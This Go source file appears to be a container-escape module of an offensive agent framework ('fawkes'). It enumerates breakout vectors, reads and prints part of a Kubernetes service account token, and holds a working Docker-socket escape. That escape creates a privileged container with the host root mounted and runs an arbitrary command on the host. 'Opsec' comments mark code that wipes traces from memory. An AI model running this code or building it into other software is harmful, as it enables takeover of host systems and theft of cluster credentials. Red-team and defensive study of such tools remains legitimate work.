//go:build linux

package commands

import (
	"bytes"
	"context"
	"encoding/json"
	"fmt"
	"io"
	"net"
	"net/http"
	"os"
	"strings"
	"time"

	"fawkes/pkg/structs"
)

// ContainerEscapeCommand attempts container escape techniques.
type ContainerEscapeCommand struct{}

func (c *ContainerEscapeCommand) Name() string { return "container-escape" }
func (c *ContainerEscapeCommand) Description() string {
	return "Attempt container escape via known breakout techniques"
}

type containerEscapeArgs struct {
	Action  string `json:"action"`
	Command string `json:"command"`
	Image   string `json:"image"`
	Path    string `json:"path"`
}

func (c *ContainerEscapeCommand) Execute(task structs.Task) structs.CommandResult {
	var args containerEscapeArgs
	if err := json.Unmarshal([]byte(task.Params), &args); err != nil {
		return errorf("Failed to parse arguments: %v", err)
	}

	if args.Action == "" {
		args.Action = "check"
	}

	var output string
	var status string

	switch args.Action {
	case "check":
		output, status = escapeCheck()
	case "docker-sock":
		output, status = escapeDockerSock(args.Command, args.Image)
	case "cgroup":
		output, status = escapeCgroupNotify(args.Command)
	case "nsenter":
		output, status = escapeNsenter(args.Command)
	case "mount-host":
		output, status = escapeMountHost(args.Path)
	default:
		output = fmt.Sprintf("Unknown action: %s. Use: check, docker-sock, cgroup, nsenter, mount-host", args.Action)
		status = "error"
	}

	return structs.CommandResult{
		Output:    output,
		Status:    status,
		Completed: true,
	}
}

// escapeCheck enumerates all available escape vectors without exploiting them.
func escapeCheck() (string, string) {
	var sb strings.Builder
	sb.WriteString("=== CONTAINER ESCAPE VECTOR CHECK ===\n\n")

	vectors := 0

	// 1. Docker socket
	for _, sock := range []string{"/var/run/docker.sock", "/run/docker.sock"} {
		if info, err := os.Stat(sock); err == nil {
			mode := info.Mode()
			// Check if writable
			if mode&0o002 != 0 || (mode&0o020 != 0) {
				sb.WriteString(fmt.Sprintf("[!] Docker socket: %s (mode: %s) — WRITABLE\n", sock, mode))
				sb.WriteString("    Use: container-escape -action docker-sock -command '<cmd>'\n\n")
				vectors++
			} else {
				sb.WriteString(fmt.Sprintf("[*] Docker socket: %s (mode: %s) — exists but check permissions\n", sock, mode))
			}
		}
	}

	// 2. Privileged container (all capabilities + no seccomp)
	privileged := false
	if data, err := os.ReadFile("/proc/self/status"); err == nil {
		capEff := parseCapEff(string(data))
		structs.ZeroBytes(data) // opsec: clear process capability data
		if isFullCaps(capEff) {
			sb.WriteString("[!] Full capabilities detected — likely PRIVILEGED container\n")
			privileged = true
			vectors++
		}
	}

	// 3. Cgroup release_agent (privileged only)
	if privileged {
		// Check if we can write to cgroup
		if data, err := os.ReadFile("/proc/1/cgroup"); err == nil {
			cgroupPath := extractCgroupPath(string(data))
			structs.ZeroBytes(data) // opsec: clear cgroup path info
			if cgroupPath != "" {
				sb.WriteString(fmt.Sprintf("[!] Cgroup path: %s — release_agent escape may be possible\n", cgroupPath))
				sb.WriteString("    Use: container-escape -action cgroup -command '<cmd>'\n\n")
				vectors++
			}
		}
	}

	// 4. Host PID namespace (/proc/1/ns/pid check)
	if selfNS, err := os.Readlink("/proc/self/ns/pid"); err == nil {
		if hostNS, err := os.Readlink("/proc/1/ns/pid"); err == nil {
			if selfNS == hostNS {
				sb.WriteString("[!] Sharing PID namespace with host — nsenter escape possible\n")
				sb.WriteString("    Use: container-escape -action nsenter -command '<cmd>'\n\n")
				vectors++
			} else {
				sb.WriteString(fmt.Sprintf("[*] PID namespace: container=%s, host=%s (isolated)\n", selfNS, hostNS))
			}
		}
	}

	// 5. /proc/sysrq-trigger (host access indicator)
	if _, err := os.Stat("/proc/sysrq-trigger"); err == nil {
		// Check if writable
		if f, err := os.OpenFile("/proc/sysrq-trigger", os.O_WRONLY, 0); err == nil {
			f.Close()
			sb.WriteString("[!] /proc/sysrq-trigger is writable — host kernel access\n\n")
			vectors++
		}
	}

	// 6. Device access (privileged indicator)
	for _, dev := range []string{"/dev/sda", "/dev/vda", "/dev/xvda", "/dev/nvme0n1"} {
		if _, err := os.Stat(dev); err == nil {
			sb.WriteString(fmt.Sprintf("[!] Host block device accessible: %s\n", dev))
			sb.WriteString("    Use: container-escape -action mount-host -path /dev/sda\n\n")
			vectors++
			break
		}
	}

	// 7. K8s service account token
	tokenPath := "/var/run/secrets/kubernetes.io/serviceaccount/token"
	if data, err := os.ReadFile(tokenPath); err == nil {
		token := string(data)
		structs.ZeroBytes(data) // opsec: clear raw token bytes
		if len(token) > 50 {
			token = token[:50] + "..."
		}
		sb.WriteString(fmt.Sprintf("[!] K8s service account token found: %s\n", token))
		sb.WriteString("    Potential for K8s API abuse (pod creation, secret access)\n\n")
		structs.ZeroString(&token) // opsec: clear truncated token
		vectors++
	}

	// 8. K8s namespace/SA info
	if ns, err := os.ReadFile("/var/run/secrets/kubernetes.io/serviceaccount/namespace"); err == nil {
		sb.WriteString(fmt.Sprintf("[*] K8s namespace: %s\n", strings.TrimSpace(string(ns))))
		structs.ZeroBytes(ns) // opsec: clear K8s namespace info
	}

	// 9. Mounted host filesystems
	if data, err := os.ReadFile("/proc/mounts"); err == nil {
		defer structs.ZeroBytes(data) // opsec: clear mount info (may reveal host paths)
		for _, line := range strings.Split(string(data), "\n") {
			fields := strings.Fields(line)
			if len(fields) >= 2 {
				mountpoint := fields[1]
				// Look for host filesystem mounts
				if strings.HasPrefix(mountpoint, "/host") ||
					(strings.HasPrefix(mountpoint, "/") && fields[0] == "/dev/sda1") {
					sb.WriteString(fmt.Sprintf("[!] Potential host mount: %s → %s\n", fields[0], mountpoint))
					vectors++
				}
			}
		}
	}

	sb.WriteString(fmt.Sprintf("\n=== %d escape vector(s) identified ===\n", vectors))
	if vectors == 0 {
		sb.WriteString("No obvious escape vectors found. Container appears well-isolated.\n")
	}

	return sb.String(), "success"
}

// dockerUnixClient creates an HTTP client that communicates via a Unix socket.
// This avoids spawning curl for Docker API communication.
func dockerUnixClient(sockPath string) *http.Client {
	return &http.Client{
		Transport: &http.Transport{
			DialContext: func(ctx context.Context, _, _ string) (net.Conn, error) {
				return net.DialTimeout("unix", sockPath, 10*time.Second)
			},
		},
		Timeout: 60 * time.Second,
	}
}

// dockerAPIPost sends a POST request to the Docker API via Unix socket.
func dockerAPIPost(client *http.Client, path string, body []byte) ([]byte, error) {
	var bodyReader io.Reader
	if body != nil {
		bodyReader = bytes.NewReader(body)
	}
	resp, err := client.Post("http://docker"+path, "application/json", bodyReader)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()
	return io.ReadAll(resp.Body)
}

// dockerAPIGet sends a GET request to the Docker API via Unix socket.
func dockerAPIGet(client *http.Client, path string) ([]byte, error) {
	resp, err := client.Get("http://docker" + path)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()
	return io.ReadAll(resp.Body)
}

// dockerAPIDelete sends a DELETE request to the Docker API via Unix socket.
func dockerAPIDelete(client *http.Client, path string) {
	req, err := http.NewRequest("DELETE", "http://docker"+path, nil)
	if err != nil {
		return
	}
	resp, err := client.Do(req)
	if err != nil {
		return
	}
	resp.Body.Close()
}

// escapeDockerSock exploits a mounted Docker socket to run a command on the host.
// Uses native Go HTTP over Unix socket — zero child process spawns.
func escapeDockerSock(command, image string) (string, string) {
	if command == "" {
		return "Required: -command '<host command to run>'", "error"
	}
	if image == "" {
		image = "alpine"
	}

	// Find the socket
	sockPath := ""
	for _, sock := range []string{"/var/run/docker.sock", "/run/docker.sock"} {
		if _, err := os.Stat(sock); err == nil {
			sockPath = sock
			break
		}
	}
	if sockPath == "" {
		return "Docker socket not found at /var/run/docker.sock or /run/docker.sock", "error"
	}

	var sb strings.Builder
	sb.WriteString(fmt.Sprintf("[*] Using Docker socket: %s\n", sockPath))
	sb.WriteString(fmt.Sprintf("[*] Image: %s\n", image))
	sb.WriteString(fmt.Sprintf("[*] Command: %s\n\n", command))

	client := dockerUnixClient(sockPath)

	// Create container with host mount and run the command
	createJSON := fmt.Sprintf(`{"Image":"%s","Cmd":["/bin/sh","-c","%s"],"HostConfig":{"Binds":["/:/hostfs"],"Privileged":true}}`,
		image, strings.ReplaceAll(command, `"`, `\"`))

	out, err := dockerAPIPost(client, "/containers/create", []byte(createJSON))
	if err != nil {
		return fmt.Sprintf("Failed to create container: %v", err), "error"
	}
	defer structs.ZeroBytes(out) // opsec: clear Docker API response

	// Parse container ID
	var createResp struct {
		ID string `json:"Id"`
	}
	if err := json.Unmarshal(out, &createResp); err != nil || createResp.ID == "" {
		return fmt.Sprintf("Failed to parse container creation response: %s", string(out)), "error"
	}
	containerID := createResp.ID[:12]
	sb.WriteString(fmt.Sprintf("[+] Container created: %s\n", containerID))

	// Start container
	if startResp, err := dockerAPIPost(client, fmt.Sprintf("/containers/%s/start", containerID), nil); err != nil {
		sb.WriteString(fmt.Sprintf("[!] Failed to start container: %v\n", err))
		return sb.String(), "error"
	} else {
		structs.ZeroBytes(startResp) // opsec: clear Docker API response
	}
	sb.WriteString("[+] Container started\n")

	// Wait for completion — log error but continue to get logs
	if waitResp, err := dockerAPIPost(client, fmt.Sprintf("/containers/%s/wait", containerID), nil); err != nil {
		sb.WriteString(fmt.Sprintf("[!] Wait error (continuing): %v\n", err))
	} else {
		structs.ZeroBytes(waitResp) // opsec: clear Docker API wait response
	}

	// Get logs
	logs, _ := dockerAPIGet(client, fmt.Sprintf("/containers/%s/logs?stdout=true&stderr=true", containerID))
	defer structs.ZeroBytes(logs) // opsec: clear container command output

	sb.WriteString("\n--- Output ---\n")
	// Docker logs have 8-byte header per line; strip it
	sb.WriteString(cleanDockerLogs(string(logs)))

	// Cleanup: remove container
	dockerAPIDelete(client, fmt.Sprintf("/containers/%s?force=true", containerID))
	sb.WriteString("\n[+] Container removed\n")

	return sb.String(), "success"
}
